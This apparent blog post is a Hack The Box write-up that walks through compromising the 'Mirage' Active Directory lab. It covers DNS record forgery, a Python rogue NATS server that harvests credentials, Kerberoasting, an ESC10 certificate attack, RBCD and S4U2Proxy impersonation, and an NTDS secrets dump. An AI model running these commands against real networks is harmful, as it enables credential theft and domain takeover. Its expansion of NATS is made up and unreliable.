---
layout: post
title:  "Hack The Box Mirage Write-up"
category : 
tags: hackthebox, mirage, windows, active-directory, hard-box, nfs, dns-spoofing, nats-server, kerberoasting, adcs, esc10, certificate-attack, rbcd, constrained-delegation, s4u2proxy, gmsa, bloodhound, certipy, impacket, evil-winrm, privilege-escalation, writeup
---

# Mirage - HackTheBox Writeup

## Machine Information
- **Name**: Mirage
- **Difficulty**: Hard
- **OS**: Windows (Active Directory)
- **IP**: 10.10.11.78
- **Domain**: mirage.htb
- **Hosts**: dc01.mirage.htb, nats-svc.mirage.htb

## Summary
Mirage is a Hard-difficulty Windows Active Directory machine that involves exploiting multiple attack vectors including NFS share enumeration, DNS spoofing, NATS server manipulation, Kerberoasting, and Active Directory Certificate Services (ADCS) exploitation via ESC10. The attack chain demonstrates advanced Active Directory techniques including Resource-Based Constrained Delegation (RBCD) and certificate-based authentication bypass.

## Initial Enumeration

### Port Scanning and Service Discovery
Initial reconnaissance revealed several services running on the target:
- **Domain Controller**: dc01.mirage.htb
- **NFS Shares**: Available for enumeration
- **DNS Server**: Accepting dynamic updates
- **NATS Server**: Running on port 4222

### NFS Share Enumeration
The enumeration began with discovering available NFS shares:

```bash
exegol-htb Mirage : showmount -e 10.10.11.78

exegol-htb Mirage : mkdir /mnt/mirage

exegol-htb Mirage : sudo mount -t nfs 10.10.11.78:/MirageReports /mnt/mirage

exegol-htb Mirage : cd /mnt/mirage

```

The NFS share contained PDF files that revealed critical intelligence about the infrastructure, including the existence of a NATS service running on `nats-svc.mirage.htb`.

## Initial Access Vector: DNS Spoofing and NATS Interception

### Understanding the NATS Service
The PDF files indicated that a NATS (Neural Autonomic Transport System) messaging service was running on `nats-svc.mirage.htb` on port 4222. NATS is a lightweight messaging system commonly used in distributed systems.

### DNS Spoofing Attack
The DNS server was found to accept unauthenticated dynamic updates, allowing for DNS record manipulation:

**Why DNS Spoofing Works:**
This attack succeeds because the DNS server accepts dynamic updates without authentication - a common misconfiguration in Active Directory-integrated DNS services. When configured insecurely, the DNS zone allows any client to send update requests without verifying their identity.

```bash
# Use nsupdate to inject forged DNS record
exegol-htb Mirage : nsupdate
exegol-htb Mirage : server 10.10.11.78
exegol-htb Mirage : update add nats-svc.mirage.htb 3600 A 10.10.15.x
exegol-htb Mirage : send
```

### Rogue NATS Server Setup
To intercept credentials, a fake NATS server was deployed to capture authentication attempts:

```python
#!/usr/bin/env python3
import socket

HOST = "0.0.0.0"
PORT = 4222

print(f"[+] Fake NATS Server listening on {HOST}:{PORT}")
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(5)

while True:
    try:
        client, addr = s.accept()
        print(f"[+] Connection from {addr}")
        
        # Send fake INFO - required for NATS client handshake
        info = b'INFO {"server_id":"FAKE","version":"2.11.0","auth_required":true}\r\n'
        client.sendall(info)
        
        # Read potential credentials
        data = client.recv(2048)
        print("[>] Received:")
        print(data.decode(errors='replace'))
        
        client.close()
    except Exception as e:
        print(f"[!] Error: {e}")
```

```bash
# Launch the rogue NATS server
exegol-htb Mirage : python3 rogue_nats.py
```

### Credential Interception
The rogue NATS server successfully intercepted credentials:
- **Username**: Dev_Account_A  
- **Password**: hx5h7F5554fP@1337!

## NATS Message Queue Exploitation

### Installing NATS Client
```bash
# Install the official NATS CLI
go install github.com/nats-io/natscli/nats@v0.0.33
```

### Accessing the Legitimate NATS Server
Using the intercepted credentials to access the real NATS server:

```bash
# Create a consumer for message reading
exegol-htb Mirage : nats --server nats://10.10.11.78:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!' consumer add auth_logs test --pull --ack explicit

# Read messages from the queue
exegol-htb Mirage : nats --server nats://10.10.11.78:4222 --user Dev_Account_A --password 'hx5h7F5554fP@1337!' consumer next auth_logs test --count=10
```

This revealed additional credentials:
- **Username**: david.jjackson
- **Password**: pN8kQmn6b86!1234@

## Active Directory Enumeration and Analysis

### Kerberos Configuration and Authentication
```bash
# Generate Kerberos configuration
nxc smb 10.10.11.78 -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --generate-krb5-file /etc/krb5.conf

# Synchronize time with target
ntpdate 10.10.11.78

# Verify credentials and enumerate users
nxc ldap 10.10.11.78 -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --users

# Generate TGT
nxc smb 10.10.11.78 -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --generate-tgt david.jjackson
export KRB5CCNAME=david.jjackson.ccache
```

### BloodHound Analysis
```bash
# Collect comprehensive BloodHound data
bloodhound-python -u david.jjackson -p 'pN8kQmn6b86!1234@' -c All -d mirage.htb -ns 10.10.11.78 --zip
```

**Key BloodHound Findings:**

1. **nathan.aadam**: Has SPNs assigned (Kerberoastable), member of IT_ADMIN group
2. **mark.bbond**: Member of IT_SUPPORT, can force password changes on javier.mmarshall, allowed to act on DC01.mirage.htb via RBCD
3. **javier.mmarshall**: Has ReadGMSAPassword privileges on MIRAGE-SERVICE (currently disabled account)
4. **DC01 machine account**: Can DCSync the domain

## Kerberoasting Attack

### Extracting Service Tickets
```bash
# Perform Kerberoasting attack
GetUserSPNs.py 'mirage.htb/david.jjackson' -dc-host dc01.mirage.htb -k -request

# Crack the TGS hash
john --wordlist=/usr/share/wordlists/rockyou.txt nathan.hash
```

This successfully cracked nathan.aadam's password, enabling further access to the domain.

### Initial Shell Access
```bash
# Generate TGT for nathan.aadam
nxc smb dc01.mirage.htb -u nathan.aadam -p 'CRACKED_PASSWORD' -k --generate-tgt nathan.aadam
export KRB5CCNAME=nathan.aadam.ccache

# Establish Evil-WinRM session
evil-winrm -i dc01.mirage.htb -u nathan.aadam -r mirage.htb
```

### User Flag
Located at `C:\Users\nathan.aadam\Desktop\user.txt`

## Privilege Escalation Phase 1: Account Reactivation

### Discovering AutoLogon Credentials
Local enumeration with WinPeas revealed AutoLogon credentials stored in the registry:

```powershell
# Via winPEASx64.exe or manual registry query
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' | Select-Object DefaultUserName, DefaultDomainName, DefaultPassword, AutoAdminLogon
```

**Discovered credentials:**
- **Username**: mark.bbond
- **Password**: 1day@atime

### Reactivating javier.mmarshall Account
Using mark.bbond's IT_SUPPORT privileges to reactivate the disabled javier.mmarshall account:

```powershell
# Enable the disabled account and clone logon hours
$Password = ConvertTo-SecureString "1day@atime" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential ("MIRAGE\mark.bbond", $Password)
Enable-ADAccount -Identity javier.mmarshall -Cred $Cred
$logonhours = Get-ADUser mark.bbond -Properties LogonHours | select-object -expand logonhours
[byte[]]$hours1 = $logonhours
Set-ADUser -Identity javier.mmarshall -Cred $Cred -Replace @{logonhours = $hours1}
```

### Password Reset via BloodyAD
```bash
# Reset javier.mmarshall's password
bloodyAD --kerberos -u "mark.bbond" -p '1day@atime' -d "mirage.htb" --host "dc01.mirage.htb" set password "javier.mmarshall" 'Password123.'

# Generate TGT for javier.mmarshall
nxc smb dc01.mirage.htb -u javier.mmarshall -p 'Password123.' -k --generate-tgt javier.mmarshall
export KRB5CCNAME=javier.mmarshall.ccache
```

## Privilege Escalation Phase 2: GMSA Password Extraction

### Extracting GMSA Credentials
With javier.mmarshall's ReadGMSAPassword privileges:

```bash
# Dump GMSA passwords
nxc ldap dc01.mirage.htb -u javier.mmarshall -p 'Password123.' -k --gmsa
```

**Result**: Obtained NTLM hash for Mirage-Service$ machine account

## Privilege Escalation Phase 3: ESC10 Certificate Attack

### Understanding ESC10 Context
ESC10 exploits weak certificate mapping in Active Directory Certificate Services. The attack is possible when:

1. `StrongCertificateBindingEnforcement` is set to audit mode (value = 1)
2. Weak TLS configurations allow certificate manipulation

### Certificate Binding Enforcement Check
```powershell
# Check certificate binding enforcement level
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" | Select-Object StrongCertificateBindingEnforcement

# Check SChannel configuration for ESC10 vulnerabilities
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL'
```

The system returned a value of **1** for StrongCertificateBindingEnforcement, indicating audit mode where weak certificate bindings are logged but still accepted.

### Certificate Manipulation Attack
Using the Mirage-Service$ account to manipulate certificate mappings:

```bash
# Generate TGT for Mirage-Service machine account
nxc smb dc01.mirage.htb -u 'Mirage-Service$' -H '7a77d15fb5a4b7035ef2524b1cc4142f' -k --generate-tgt 'Mirage-Service$'

# Update altSecurityIdentities for mark.bbond
export KRB5CCNAME=Mirage-Service$.ccache 
certipy account -u 'Mirage-Service$' -k -target dc01.mirage.htb -upn 'dc01$@mirage.htb' -user 'mark.bbond' update

# Request certificate using User template
export KRB5CCNAME=mark.bbond.ccache 
certipy req -k -target dc01.mirage.htb -ca 'mirage-DC01-CA' -template 'User' -dc-ip 10.10.11.78

# Update altSecurityIdentities to enable certificate authentication
export KRB5CCNAME=Mirage-Service$.ccache 
certipy account -u 'Mirage-Service$' -k -target dc01.mirage.htb -upn 'mark.bbond@mirage.htb' -user 'mark.bbond' update 
-dc-ip 10.10.11.78
```

## Privilege Escalation Phase 4: RBCD Configuration

### LDAP Shell Access via Certificate Authentication
```bash
# Authenticate using the generated PFX certificate
certipy auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell
```

### Configuring Resource-Based Constrained Delegation
From the LDAP shell, configure RBCD to allow nathan.aadam to impersonate users on DC01:

```bash
# Configure RBCD from dc01 to nathan.aadam
set_rbcd dc01$ nathan.aadam
```

This grants nathan.aadam the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the DC01 computer object, enabling delegation rights.

## Privilege Escalation Phase 5: S4U2Proxy Impersonation

### Service Ticket Impersonation
```bash
# Request service ticket by impersonating DC01 machine account
getST.py -spn 'CIFS/dc01.mirage.htb' -impersonate 'DC01$' 'MIRAGE.HTB/nathan.aadam:3edc#EDC3' -k

# Set the impersonated ticket
export KRB5CCNAME='DC01$.ccache'
```

## Final Privilege Escalation: Domain Admin Access

### NTDS Secrets Dump
```bash
# Dump NTDS secrets using the impersonated machine account ticket
secretsdump.py -k -no-pass dc01.mirage.htb
```

### Administrator Access
```bash
# Request TGT for Administrator using extracted NTLM hash
getTGT.py -hashes :7be6d4f3c2b9c0e3560f5a29exxxxxx -dc-ip 10.10.11.78 mirage.htb/Administrator

# Set Administrator ticket
export KRB5CCNAME=Administrator.ccache

# Access as Administrator
evil-winrm -i dc01.mirage.htb -u Administrator -r mirage.htb
```

### Root Flag
Located at `C:\Users\Administrator\Desktop\root.txt`

## Attack Chain Summary

1. **NFS Share Enumeration** → PDF intelligence gathering
2. **DNS Spoofing** → Redirect NATS traffic to rogue server
3. **NATS Credential Interception** → Capture Dev_Account_A credentials
4. **NATS Message Queue Access** → Extract david.jjackson credentials
5. **Kerberoasting** → Crack nathan.aadam password
6. **AutoLogon Discovery** → Find mark.bbond credentials
7. **Account Reactivation** → Enable javier.mmarshall via IT_SUPPORT privileges
8. **GMSA Password Extraction** → Obtain Mirage-Service$ hash
9. **ESC10 Certificate Attack** → Manipulate certificate mappings
10. **RBCD Configuration** → Grant delegation rights to nathan.aadam
11. **S4U2Proxy Impersonation** → Impersonate DC01 machine account
12. **NTDS Dump** → Extract all domain hashes including Administrator

